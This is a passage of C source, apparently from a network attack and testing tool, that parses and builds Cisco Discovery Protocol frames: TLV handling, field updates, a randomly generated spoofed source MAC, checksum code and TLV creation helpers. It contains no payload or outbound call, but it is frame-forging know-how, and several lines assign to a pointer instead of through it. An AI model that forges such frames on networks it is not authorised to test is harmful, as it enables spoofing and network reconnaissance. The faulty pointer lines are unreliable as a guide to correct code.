                        case CDP_TYPE_CAPABILITY: /* 4 byte field */
                            if (len == 8) {
                                snprintf(tlv, 9, "%02X%02X%02X%02X", *(ptr+4), *(ptr+5), *(ptr+6), *(ptr+7));
                                tlv += 9;
                                total += 9;
                            }
                        break;
                /*      case CDP_TYPE_IPPREFIX:
                        case CDP_TYPE_PROTOCOL_HELLO:*/
                        case CDP_TYPE_NATIVE_VLAN:
                            snprintf(tlv, 5, "%04X", ntohs(*((u_int16_t *)(ptr+4))));
                            tlv += 5;
                            total += 5;
                        break;
                        case CDP_TYPE_DUPLEX:
                        case CDP_TYPE_TRUST_BITMAP:
                        case CDP_TYPE_UNTRUSTED_COS:
                            snprintf(tlv, 3, "%02X", *((u_int8_t *)(ptr+4)));
                            tlv += 3;
                            total += 3;
                        break;
                    /*  case CDP_TYPE_VOIP_VLAN_REPLY:
                        case CDP_TYPE_VOIP_VLAN_QUERY:
                        case CDP_TYPE_MTU:
                        case CDP_TYPE_SYSTEM_OID:*/
                        default:
                            buf_ptr = '\0';
                            buf_ptr++;
                            total++;
                        break;
                    
             }

#endif
          }
          i++;
       }
    }

    buf_ptr = '\0';
    total++;

   if (total > 0)
   {
      if ((field_values[CDP_TLV] = (char *) calloc(1, total)) == NULL)
         write_log(0, "error in calloc\n");
      
      memcpy((void *)field_values[CDP_TLV], (void *)buffer, total);
   }

    return (char **)field_values;
}


char *
cdp_get_type_info(u_int16_t type)
{
    u_int8_t i;

    i = 0;
    while (cdp_type_desc[i].desc) {
        if (cdp_type_desc[i].type == type)
            return cdp_type_desc[i].desc;
        i++;
    }

    return "(Unknown)";
}


/* Take care: options in the store are stored in network byte order */
int8_t
cdp_load_values(struct pcap_data *data, void *values)
{
    struct libnet_802_3_hdr *ether;
    struct cdp_data *cdp;
    struct commands_param_extra_item *newitem;
    u_char *cdp_data, *ptr;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
#endif
    u_int8_t i;
    u_int16_t type, len, total;

    cdp = (struct cdp_data *)values;
    ether = (struct libnet_802_3_hdr *) data->packet;
    cdp_data = (u_char *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

    /* Source MAC */
    memcpy(cdp->mac_source, ether->_802_3_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(cdp->mac_dest, ether->_802_3_dhost, ETHER_ADDR_LEN);

    /* Version */
    cdp->version = *((u_int8_t *)cdp_data);

    /* TTL */
    cdp->ttl = *((u_int8_t *)cdp_data + 1);

    /* Checksum... it is something boring to change the ck to 0... better we can
     * avoid it... 
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, cdp_data+2, 2);
    cdp->checksum = ntohs(aux_short);
#else
    cdp->checksum = ntohs(*(u_int16_t *)(cdp_data + 2));
#endif
*/
    ptr = cdp_data + 4;
    i = 0;
    total = 0;

    if (cdp->extra)
       dlist_delete(cdp->extra);

    /* now the tlv section starts */
    while((ptr < data->packet + data->header->caplen) && (i < MAX_TLV) && (total < MAX_TLV*MAX_VALUE_LENGTH)) {
        if ((ptr+4) > ( data->packet + data->header->caplen)) /* Undersized packet !! */
            return 0;
#ifdef LBL_ALIGN
        memcpy((void *)&aux_short,ptr,2);
        type = ntohs(aux_short);
        memcpy((void*)&aux_short,(ptr+2),2);
        len = ntohs(aux_short);
#else
        type = ntohs(*(u_int16_t *)ptr);
        len = ntohs(*(u_int16_t *)(ptr + 2));
#endif

        if ((ptr + len) > data->packet + data->header->caplen)
            return -1; /* Oversized packet!! */

        if (!len)
            return 0;

        /*
         * TLV len must be at least 5 bytes (header + data).  
         * Anyway i think we can give a chance to the rest
         * of TLVs... ;)
         */
        if ((len >= 4) && (total + len < MAX_TLV*MAX_VALUE_LENGTH)) 
        {
           if ((newitem = (struct commands_param_extra_item *) calloc(1, sizeof(struct commands_param_extra_item))) == NULL)
           {
              write_log(0, "Error in calloc\n");
              return -1;
           }

           if ((newitem->value = (u_int8_t *) calloc(1, len - 4)) == NULL)
           {
              write_log(0, "Error in calloc\n");
              return -1;
           }
           
           memcpy((void *)newitem->id, (void *)&type, 2);
           memcpy((void *)newitem->value, (void *)(ptr + 4), len - 4);
           cdp->extra = dlist_append(cdp->extra, (void *)newitem);
        }

        i++;
        ptr += len;
        total += len;
    }

    cdp->options_len = total;

    return 0;
}


int8_t 
cdp_update_field(int8_t state, struct term_node *node, void *value)
{
    struct cdp_data *cdp_data;
    
	if (node == NULL)
		cdp_data = protocols[PROTO_CDP].default_values;
	else
        cdp_data = node->protocol[PROTO_CDP].tmp_data;

    switch(state)
    {
		/* Source MAC */
        case CDP_SMAC:
			memcpy((void *)cdp_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case CDP_DMAC:
			memcpy((void *)cdp_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Version */
        case CDP_VER:
	        cdp_data->version = *(u_int8_t *)value;
        break;

        /* TTL */
        case CDP_TTL:
	        cdp_data->ttl = *(u_int8_t *)value;
        break;

        /* Checksum */
		case CDP_CHECKSUM:
	        cdp_data->checksum = *(u_int16_t *)value;
        break;
		default:
		break;
    }

    return 0;
}


int8_t 
cdp_init_attribs(struct term_node *node)
{
    struct cdp_data *cdp_data;

    cdp_data = node->protocol[PROTO_CDP].tmp_data;
    
    cdp_data->version = CDP_DFL_VERSION;
    cdp_data->ttl     = CDP_DFL_TTL;

    attack_gen_mac(cdp_data->mac_source);
    
    cdp_data->mac_source[0] &= 0x0E;
    
    parser_vrfy_mac("01:00:0C:CC:CC:CC", cdp_data->mac_dest);

    cdp_data->options_len = 0;

    cdp_data->extra = NULL;

    return 0;
}

void *
cdp_get_extra_field(struct term_node *node, void *extra, u_int8_t write)
{
   struct cdp_data *cdp_data;

   cdp_data = node->protocol[PROTO_CDP].tmp_data;

   if (write)
      cdp_data->extra = extra;

   return cdp_data->extra;
}

/* returns the checksum 
 * WARNING: if left over bytes are present, the memory after *data has to
 * contain 0x00 series and should be part of the buffer
 * -> make the buffer for data at least count+1 bytes long ! */
u_int16_t 
cdp_chksum(u_int8_t *data, u_int32_t count) {
    u_int32_t sum;
    u_int16_t *wrd;

    sum = 0;
    wrd = (u_int16_t *)data;
    
    while( count > 1 )  {
        sum = sum + *wrd;
        wrd++;
        count -= 2;
    }

    /*  Add left-over byte, if any */
    if( count > 0 ) {
/*	printf("Left over byte: %04X\n",((*wrd & 0xFF)<<8));*/
	    sum = sum + ((*wrd &0xFF)<<8);
    }

    /*  Fold 32-bit sum to 16 bits */
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (~sum);
}



int8_t
cdp_tlv_devid(void *aux_node, void *value, char *printable)
{
    struct term_node *node = aux_node;
    
    if (cdp_create_tlv_item(node->protocol[PROTO_CDP].tmp_data, CDP_TYPE_DEVID, value) < 0)
        return -1;

    return 0;
}

int8_t
cdp_tlv_portid(void *aux_node, void *value, char *printable)
{
    struct term_node *node = aux_node;
    
    if (cdp_create_tlv_item(node->protocol[PROTO_CDP].tmp_data, CDP_TYPE_PORTID, value) < 0)
        return -1;

    return 0;
}

int8_t
cdp_tlv_version(void *aux_node, void *value, char *printable)
{
    struct term_node *node = aux_node;
    
    if (cdp_create_tlv_item(node->protocol[PROTO_CDP].tmp_data, CDP_TYPE_VERSION, value) < 0)
        return -1;

    return 0;
}

int8_t
cdp_tlv_platform(void *aux_node, void *value, char *printable)
{
    struct term_node *node = aux_node;
    
    if (cdp_create_tlv_item(node->protocol[PROTO_CDP].tmp_data, CDP_TYPE_PLATFORM, value) < 0)
        return -1;

    return 0;
}

int8_t
cdp_tlv_address(void *aux_node, void *value, char *printable)
{
    struct term_node *node = aux_node;
    
    if (cdp_create_tlv_item(node->protocol[PROTO_CDP].tmp_data, CDP_TYPE_ADDRESS, value) < 0)
        return -1;

    return 0;
}


int8_t
cdp_end(struct term_node *node)
{
   struct cdp_data *cdp_data;

   cdp_data = (struct cdp_data *) node->protocol[PROTO_CDP].tmp_data; 

   if (cdp_data->extra)
      dlist_delete(cdp_data->extra);

   return 0;
}
/* vim:set tabstop=4:set expandtab:set shiftwidth=4:set textwidth=78: */
